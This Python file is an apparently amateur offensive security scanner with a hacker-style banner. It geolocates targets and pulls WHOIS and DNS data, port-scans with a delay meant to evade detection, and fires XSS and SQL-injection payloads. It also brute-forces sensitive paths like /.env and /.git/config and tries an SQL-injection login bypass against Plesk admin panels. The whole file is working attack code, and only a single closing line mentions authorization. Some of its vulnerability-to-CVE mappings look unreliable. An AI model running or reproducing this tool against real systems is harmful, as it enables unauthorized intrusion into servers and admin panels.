import requests
import socket
import threading
import json
import re
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from datetime import datetime
import logging
import whois
import dns.resolver

# Disable warnings for unverified HTTPS requests
requests.packages.urllib3.disable_warnings()

# ================= CONFIG =================
DEFAULT_TIMEOUT = 5
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 3389, 8080, 8443, 8888]
BANNER_GRAB_PORTS = [21, 22, 23, 25, 80, 110, 143, 443, 3306, 3389]
KNOWN_PATHS = [
    "/.env", "/config.php", "/.git/config", "/plesk-stat/", "/export.tar.gz",
    "/backup.zip", "/phpinfo.php", "/test.php", "/readme.html", "/admin", "/login",
    "/robots.txt", "/sitemap.xml", "/wp-admin", "/adminer.php", "/phpmyadmin"
]
VULN_PATTERNS = {
    "Apache/2.2": "Outdated Apache version (pre-2.4), vulnerable to CVE-2017-5638",
    "PleskLin": "Potential Plesk server, check for CVE-2023-24044",
    "PHP/5.": "Outdated PHP version, may be vulnerable to multiple CVEs",
    "nginx/1.": "Outdated nginx version, check for known CVEs",
    "IIS/6.": "Outdated IIS version, vulnerable to multiple CVEs"
}
XSS_PAYLOAD = "<script>alert('XSS')</script>"
SQLI_PAYLOAD = "' OR '1'='1"
DIRECTORY_LIST = ["/admin", "/backup", "/config", "/db", "/logs", "/test", "/upload"]  # Basic directory brute-force

# Setup logging
logging.basicConfig(filename="anish_scanner.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# ================= BANNER =================
def print_banner():
    print(r"""
     █████╗ ███╗   ██╗██╗███████╗██╗  ██╗    ██╗  ██╗██╗   ██╗███████╗██╗  ██╗██╗    ██╗ █████╗ ██╗  ██╗ █████
    ██╔══██╗████╗  ██║██║██╔════╝██║  ██║    ██║ ██╔╝██║   ██║██╔════╝██║  ██║██║    ██║██╔══██╗██║  ██║██╔══██╗
    ███████║██╔██╗ ██║██║███████╗███████║    █████╔╝ ██║   ██║███████╗███████║██║ █╗ ██║███████║███████║███████║
    ██╔══██║██║╚██╗██║██║╚════██║██╔══██║    ██╔═██╗ ██║   ██║╚════██║██╔══██║██║███╗██║██╔══██║██╔══██║██╔══██║
    ██║  ██║██║ ╚████║██║███████║██║  ██║    ██║  ██╗╚██████╔╝███████║██║  ██║╚███╔███╔╝██║  ██║██║  ██║██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

    Anish... Security Scanner v3.2 💀☠️
    Created by :-  𝔸ℕ𝕀𝕊ℍ 𝕂𝕌𝕊ℍ𝕎𝔸ℍ𝔸
    Website    :-  Anish-Kushwaha.online  ||  AnishKushwaha.co.in
    Email      :-  Anish_Kushwaha@proton.me
    Now with automatic IP and port detection from URL, and scheme auto-fix!
""")

# ================= UTILITY FUNCTIONS =================
def parse_url_and_detect_port(url):
    parsed = urlparse(url)
    domain = parsed.netloc.split(':')[0]  # Remove port if present
    port = parsed.port  # None if not specified
    if not port:
        port = 8443  # Default for Plesk/admin panels
    return domain, port

def resolve_ip(domain):
    try:
        ip = socket.gethostbyname(domain)
        return ip
    except Exception as e:
        print(f"[!] Error resolving IP for {domain}: {e}")
        return None

def get_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=DEFAULT_TIMEOUT)
        data = response.json()
        if data['status'] == 'success':
            return {
                "country": data.get("country", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "city": data.get("city", "Unknown"),
                "isp": data.get("isp", "Unknown")
            }
        else:
            return {"error": "Geolocation failed"}
    except Exception as e:
        return {"error": str(e)}

def get_whois_info(domain):
    try:
        w = whois.whois(domain)
        return {
            "registrar": w.registrar,
            "creation_date": str(w.creation_date),
            "expiration_date": str(w.expiration_date),
            "name_servers": w.name_servers
        }
    except Exception as e:
        return {"error": str(e)}

def get_dns_records(domain):
    records = {}
    try:
        for record_type in ['A', 'MX', 'TXT', 'CNAME']:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                records[record_type] = [str(rdata) for rdata in answers]
            except:
                records[record_type] = []
    except Exception as e:
        records["error"] = str(e)
    return records

# ================= NETWORK SCANNER =================
def scan_port(ip, port, results, rate_limit=0.01):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(DEFAULT_TIMEOUT)
            result = sock.connect_ex((ip, port))
            if result == 0:
                banner = ""
                if port in BANNER_GRAB_PORTS:
                    try:
                        sock.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = sock.recv(1024).decode(errors="ignore")
                    except:
                        banner = "Open, but no banner"
                # Check for known vulnerabilities in banner
                vuln_info = check_vuln_banner(banner)
                results.append((port, banner.strip(), vuln_info))
                logging.info(f"Port {port} open on {ip}: {banner.strip()} - {vuln_info}")
    except Exception as e:
        logging.error(f"Error scanning port {port} on {ip}: {e}")
    finally:
        time.sleep(rate_limit)  # Rate limiting to avoid detection

def check_vuln_banner(banner):
    for pattern, desc in VULN_PATTERNS.items():
        if pattern in banner:
            return f"⚠️ {desc}"
    return "No known vulnerabilities detected"

def run_network_scan(ip, port_range=COMMON_PORTS):
    print("")
    print("**************************************************")
    print("")
    print(f"\n[🔍] 𝐑𝐮𝐧𝐧𝐢𝐧𝐠 𝐧𝐞𝐭𝐰𝐨𝐫𝐤 𝐬𝐜𝐚𝐧 𝐨𝐧  {ip}...")
    threads = []
    results = []
    for port in port_range:
        thread = threading.Thread(target=scan_port, args=(ip, port, results))
        thread.start()
        threads.append(thread)
    for t in threads:
        t.join()
    print("\n[+] Open Ports:")
    print("")
    for port, banner, vuln_info in sorted(results):
        print(f"  Port {port}/tcp - {banner} - {vuln_info}")
    return results

# ================= WEB VULNERABILITY SCANNER =================
def scan_web_vulnerabilities(base_url):
    print("\n[🕸️] 𝐒𝐜𝐚𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 𝐰𝐞𝐛 𝐯𝐮𝐥𝐧𝐞𝐫𝐚𝐛𝐢𝐥𝐢𝐭𝐢𝐞𝐬 𝐚𝐧𝐝 𝐠𝐫𝐚𝐛𝐛𝐢𝐧𝐠 𝐡𝐢𝐝𝐝𝐞𝐧 𝐝𝐞𝐭𝐚𝐢𝐥𝐬....")
    results = []
    
    try:
        r = requests.get(base_url, verify=False, timeout=DEFAULT_TIMEOUT)
        soup = BeautifulSoup(r.text, "html.parser")
        
        # Extract hidden details
        meta_tags = {meta.get('name'): meta.get('content') for meta in soup.find_all('meta') if meta.get('name')}
        title = soup.title.string.strip() if soup.title else "No title"
        headers = dict(r.headers)
        
        print(f"[+] Page Title: {title}")
        print(f"[+] Meta Tags: {meta_tags}")
        print(f"[+] Response Headers: {headers}")
        
        results.append({"type": "Page Info", "title": title, "meta": meta_tags, "headers": headers})
        
        # Check for XSS
        xss_url = urljoin(base_url, f"?test={XSS_PAYLOAD}")
        r_xss = requests.get(xss_url, verify=False, timeout=DEFAULT_TIMEOUT)
        if XSS_PAYLOAD in r_xss.text:
            print(f"[!] Potential XSS vulnerability at {xss_url}")
            results.append({"type": "XSS", "url": xss_url, "severity": "High"})
            logging.warning(f"XSS detected at {xss_url}")
        
        # Check for SQLi
        sqli_url = urljoin(base_url, f"?id={SQLI_PAYLOAD}")
        r_sqli = requests.get(sqli_url, verify=False, timeout=DEFAULT_TIMEOUT)
        if "mysql" in r_sqli.text.lower() or "sql syntax" in r_sqli.text.lower():
            print(f"[!] Potential SQLi vulnerability at {sqli_url}")
            results.append({"type": "SQLi", "url": sqli_url, "severity": "Critical"})
            logging.warning(f"SQLi detected at {sqli_url}")
        
        # Directory brute-force
        print("\n[*] Brute-forcing directories...")
        for dir in DIRECTORY_LIST:
            dir_url = urljoin(base_url, dir)
            try:
                r_dir = requests.get(dir_url, verify=False, timeout=DEFAULT_TIMEOUT)
                if r_dir.status_code == 200:
                    print(f"[!] Found accessible directory: {dir_url}")
                    results.append({"type": "Exposed Directory", "url": dir_url, "severity": "Medium"})
                    logging.warning(f"Exposed directory: {dir_url}")
            except:
                pass
        
    except Exception as e:
        print(f"[!] Error scanning web: {e}")
        logging.error(f"Web scan error for {base_url}: {e}")
    
    return results

# ================= PLESK EXPLOIT SCANNER =================
def scan_plesk(ip, port):
    base_url = f"https://{ip}:{port}"
    print("")
    print("\n[🚀] 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐏𝐥𝐞𝐬𝐤 𝐀𝐝𝐦𝐢𝐧 𝐁𝐲𝐩𝐚𝐬𝐬 𝐒𝐜𝐚𝐧𝐧𝐞𝐫...")
    print("")
    print("")

    results = []
    try:
        print("[*] Checking if Plesk panel is accessible...")
        print("")
        r = requests.get(base_url, verify=False, timeout=DEFAULT_TIMEOUT)
        print(f"[+] Status Code: {r.status_code}")
        soup = BeautifulSoup(r.text, "html.parser")
        title = soup.title.string.strip() if soup.title else "No title"
        print(f"[+] Page Title: {title}")
        results.append({"type": "Plesk Access", "status": r.status_code, "title": title})
        logging.info(f"Plesk panel at {base_url}: Status {r.status_code}, Title: {title}")
    except Exception as e:
        print(f"[!] Connection Error: {e}")
        logging.error(f"Connection error at {base_url}: {e}")
        
        print("")

    try:
        print("[*] Trying to grab version from headers...")
        print("")
        r = requests.get(base_url, verify=False, timeout=DEFAULT_TIMEOUT)
        headers = r.headers
        for h in ["Server", "X-Powered-By"]:
            if h in headers:
                print(f"[+] {h}: {headers[h]}")
                vuln_info = check_vuln_banner(headers[h])
                results.append({"type": "Header", "name": h, "value": headers[h], "vuln_info": vuln_info})
                logging.info(f"Header {h}: {headers[h]} - {vuln_info}")
    except:
        print("[!] Failed to fetch headers")
        logging.error(f"Failed to fetch headers for {base_url}")
        
        print("")
        print("")

    print("[*] 𝐀𝐭𝐭𝐞𝐦𝐩𝐭𝐢𝐧𝐠 𝐒𝐐𝐋𝐢 𝐥𝐨𝐠𝐢𝐧 𝐛𝐲𝐩𝐚𝐬𝐬...")

    print("")
    payload = {"login_name": "admin' OR '1'='1", "passwd": "random"}
    try:
        login_url = urljoin(base_url, "/login_up.php")
        r = requests.post(login_url, data=payload, verify=False, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
        if r.status_code in [302, 301]:
            print("[+] Possible SQLi login bypass! Redirected after POST.")
            print("")
            results.append({"type": "SQLi Bypass", "url": login_url, "status": r.status_code, "severity": "Critical"})
            logging.warning(f"Possible SQLi bypass at {login_url}: Status {r.status_code}")
        else:
            print(f"[-] Login bypass failed. Status: {r.status_code}")
    except Exception as e:
        print(f"[!] Error during login attempt: {e}")
        logging.error(f"SQLi login attempt error at {login_url}: {e}")
        
        print("")

    print("[*] Checking known vulnerable or exposed paths...")
    print("")
    for path in KNOWN_PATHS:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, verify=False, timeout=DEFAULT_TIMEOUT)
            if r.status_code == 200:
                print(f"[!] Found exposed path: {url}")
                results.append({"type": "Exposed Path", "url": url, "status": r.status_code, "severity": "Medium"})
                logging.warning(f"Exposed path found: {url}")
            else:
                print(f"[-] {url} => Status: {r.status_code}")
        except Exception as e:
            print(f"[!] {url} => Error: {e}")
            logging.error(f"Error checking path {url}: {e}")

    return results

# ================= REPORT GENERATOR =================
def generate_report(url, ip, domain, geolocation, whois_info, dns_records, port, network_results, plesk_results, web_results, output_file="anish_scanner_report.json"):
    report = {
        "timestamp": datetime.now().isoformat(),
        "target_url": url,
        "target_ip": ip,
        "domain": domain,
        "geolocation": geolocation,
        "whois": whois_info,
        "dns_records": dns_records,
        "target_port": port,
        "network_scan": [
            {"port": port, "banner": banner, "vulnerabilities": vuln_info}
            for port, banner, vuln_info in network_results
        ],
        "plesk_scan": plesk_results,
        "web_vulnerabilities": web_results
    }
    with open(output_file, "w") as f:
        json.dump(report, f, indent=4)
    print(f"\n[📝] Report generated: {output_file}")
    logging.info(f"Report generated: {output_file}")

# ================= MAIN =================
if __name__ == "__main__":
    print_banner()
    target_url = input("Enter the target URL (e.g., https://example.com or example.com:8443): ").strip()
    print("")

    # Validate input
    if not target_url:
        print("[!] Error: Target URL is required.")
        exit(1)

    # Auto-fix scheme if missing
    if not urlparse(target_url).scheme:
        target_url = "https://" + target_url
        print(f"[+] Auto-corrected URL to: {target_url}")

    # Parse URL and detect port
    domain, target_port = parse_url_and_detect_port(target_url)
    print(f"[+] Parsed Domain: {domain}")
    print(f"[+] Detected/Auto Port: {target_port}")

    # Resolve IP
    ip = resolve_ip(domain)
    if not ip:
        print("[!] Could not resolve IP. Exiting.")
        exit(1)
    print(f"[+] Resolved IP: {ip}")

    # Get geolocation
    geolocation = get_geolocation(ip)
    print(f"[+] Geolocation: {geolocation}")

    # Get WHOIS and DNS
    whois_info = get_whois_info(domain)
    dns_records = get_dns_records(domain)
    print(f"[+] WHOIS Info: {whois_info}")
    print(f"[+] DNS Records: {dns_records}")

    start_time = datetime.now()

    # Run scans
    network_results = run_network_scan(ip)
    plesk_results = scan_plesk(ip, target_port)
    web_results = scan_web_vulnerabilities(target_url)

    # Generate report
    generate_report(target_url, ip, domain, geolocation, whois_info, dns_records, target_port, network_results, plesk_results, web_results)

    print("\n[✔] Scan completed in", datetime.now() - start_time)
    print("")
  
    print("⚠️  REMINDER: Unauthorized scanning is illegal. Use only on systems you own or have permission for.")
